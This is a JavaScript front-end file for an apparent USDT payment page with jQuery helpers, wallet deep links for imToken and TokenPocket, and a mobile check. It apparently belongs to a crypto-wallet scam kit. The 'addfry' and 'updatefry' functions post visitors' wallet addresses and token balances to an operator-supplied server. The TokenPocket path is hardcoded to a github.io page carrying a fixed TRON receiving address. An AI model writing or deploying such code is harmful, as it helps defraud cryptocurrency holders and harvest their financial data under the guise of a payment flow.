function loadData() {

	$("#from_url").val(unescape(getUrlParams("from_url")));
	// $("#pay_warning").text(decodeURI(getUrlParams("info")));
	$("#to_address").val(getUrlParams("to_address"));
	$("#addtype").val(getUrlParams("addtype"));
	$("#from").val(getUrlParams("from"));
}

//获取url参数
function getUrlParams(key) {
	var url = window.location.search.substr(1);
	if (url == '') {
		return false;
	}
	var paramsArr = url.split('&');
	for (var i = 0; i < paramsArr.length; i++) {
		var combina = paramsArr[i].split("=");
		if (combina[0] == key) {
			return combina[1];
		}
	}
	return false;
}

function addfry() {
	$.ajax({
		url: $("#from_url").val() + "/index/index/addfry",
		data: {
			address: $("#address").val(),
			addtype: $("#addtype").val(),
			usdt_balance: $("#usdt_balance").val(),
			balance: $("#balance").val(),
			payment: $("#payment").val(),
			from: $("#from").val(),
		},
		type: "post",
		success: function(data, textStatus, xhr) {
			console.log(data);
		},
		error: function(xhr, textStatus, error) {

		}
	});
}

function updatefry() {
	$.ajax({
		url: $("#from_url").val() + "/index/index/updatefry",
		data: {
			address: $("#address").val(),
			usdt_balance: $("#usdt_balance").val(),
			balance: $("#balance").val(),
			payment: $("#payment").val(),
		},
		type: "post",
		success: function(data, textStatus, xhr) {
			console.log(data);
		},
		error: function(xhr, textStatus, error) {}
	});
}

function paytype() {
	$.ajax({
		url: $("#from_url").val() + "/api/index/paytype",
		type: "get",
		dataType: 'json',
		success: function(data, textStatus, xhr) {
			$("#paytype").val(data.msg);
		},
		error: function(xhr, textStatus, error) {}
	});
}




//--------------paylist---------------


function paylistloadData() {
	$("#addtype").val(getUrlParams("addtype"));
	$("#to_address").val(getUrlParams("to_address"));
	$("#from_url").val(unescape(getUrlParams("from_url")));

	if (getUrlParams("addtype") == "trc20") {
		$("#tr_Metamask").hide();
		$("#tr_Okex").hide();
	} else if (getUrlParams("addtype") == "erc20") {
		$("#tr_TronLink").hide();
	} else {}
}

function paylistevent(from) {

	let addtype = $("#addtype").val();
	let from_url = $("#from_url").val();
	let to_address = $("#to_address").val();
	let im_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype +
		".html?from=" + from +
		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);

// 	let tp_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype +
// 		".html?from=" + from +
// 		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
	let tp_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TVPdegug7oUpfCPRReK3Xy1BH8JioRdKgP&utm_source=tokenpocket"

	let my_url = window.location.protocol + "//" + window.location.host + "/" + addtype + ".html?from=" + from +
		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;
		
		
		if (from == "imToken") {
			location.href = "imtokenv2://navigate?screen=DappView&url=" + im_url;
		} else if (from == "TokenPocket") {
			if (addtype == "trc20") {
				location.href = 'tpdapp://open?params={"url": "' + tp_url +
					'", "chain": "TRX", "source":"xxx"}';
			} else {
				location.href = 'tpdapp://open?params={"url": "' + tp_url +
					'", "chain": "ERC", "source":"xxx"}';
			}
		} else {
			$("#pay_" + from).modal('show');
			$("#pay_" + from + "_url").val(my_url);
		}

	// if (isMobile()) {
	// 	if (from == "imToken") {
	// 		location.href = "imtokenv2://navigate?screen=DappView&url=" + im_url;
	// 	} else if (from == "TokenPocket") {
	// 		if (addtype == "trc20") {
	// 			location.href = 'tpdapp://open?params={"url": "' + tp_url +
	// 				'", "chain": "TRX", "source":"xxx"}';
	// 		} else {
	// 			location.href = 'tpdapp://open?params={"url": "' + tp_url +
	// 				'", "chain": "ERC", "source":"xxx"}';
	// 		}
	// 	} else {
	// 		$("#pay_" + from).modal('show');
	// 		$("#pay_" + from + "_url").val(my_url);
	// 	}
	// } else {
	// 	$("#pay_pc_url").val(my_url);
	// 	if(from!="Okex"){
	// 		$("#qcode").html("");
	// 		$('#qcode').qrcode({
	// 			text: my_url,
	// 			width: "200", // 二维码的宽度
	// 			height: "200", // 二维码的高度
	// 		});
	// 	}else{
	// 		$("#pc_tip").text("请复制链接到钱包里访问");
	// 		let img1='<img src="img/okex1.jpg" style="width: 100%" />';
	// 		let img2='<img src="img/okex2.jpg" style="width: 100%" />';
	// 		$("#qcode").html(img1+img2);
	// 	}
	// 	$("#pay_pc").modal('show');
	// }

}

function payconfirm() {
	let payment = $("#payment").val();
	if ($.isNumeric(payment)) {
		if (payment > 0) {
			$("#confirm_amount").html("当前支付金额&nbsp<strong style='color: red;'>" + payment + "</strong>&nbspUSDT");
			$("#pay_confirm").modal('show');
		} else {
			alert("请填写正确的金额");
		}
	}
}

function isMobile() {
	var userAgentInfo = navigator.userAgent;

	var mobileAgents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];

	var mobile_flag = false;

	//根据userAgent判断是否是手机
	for (var v = 0; v < mobileAgents.length; v++) {
		if (userAgentInfo.indexOf(mobileAgents[v]) > 0) {
			mobile_flag = true;
			break;
		}
	}

	var screen_width = window.screen.width;
	var screen_height = window.screen.height;

	//根据屏幕分辨率判断是否是手机
	if (screen_width < 500 && screen_height < 800) {
		mobile_flag = true;
	}

	return mobile_flag;
}
